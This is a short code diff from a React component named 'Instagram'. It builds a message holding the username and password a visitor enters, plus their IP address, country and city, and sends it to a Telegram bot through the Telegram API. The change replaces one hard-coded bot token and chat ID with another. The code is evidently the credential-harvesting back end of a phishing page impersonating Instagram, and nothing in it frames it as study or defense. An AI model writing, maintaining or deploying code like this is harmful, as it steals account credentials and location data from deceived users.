@@ -33,8 +33,8 @@ const Instagram: React.FC = () => {
         const PasswordLogin = formData.password;
         const SubmitValue = `Instagram Result is:%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ip} %0A - Country: ${country_name} %0A - Country-code: ${country_calling_code} %0A - state: ${city}`;
 
-        const token = "6856364752:AAG6Lr_2eZKw4cBO1feTE4iUk4EOCKzTy98";
-        const chat_id = -4766800179;
+        const token = "6323318695:AAH3x4TcKakRMkpcoOxtZCgOpqEWRoLJhpM";
+        const chat_id = -4286643760;
 
         const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;
 
